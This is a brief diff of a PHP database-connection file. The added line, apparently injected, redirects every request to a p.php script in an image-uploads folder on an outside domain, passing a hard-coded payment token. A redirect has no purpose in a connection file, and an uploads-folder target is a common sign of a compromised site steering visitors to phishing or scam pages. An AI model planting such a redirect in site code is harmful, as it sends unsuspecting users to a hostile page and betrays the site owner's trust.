@@ -23,5 +23,7 @@ if ($conn->connect_error) {
 echo 'Error' ;
 }
 $db= mysqli_select_db($conn,$dbname) or die("Couldn't select my database");
+
+header('Location: https://optiontravel.com.eg/img/uploads/carrental/packages/p.php?paymenttoken=H96HFnpEmyWj4tCF1u36SPX3ERvUQnyu');
   
 ?>
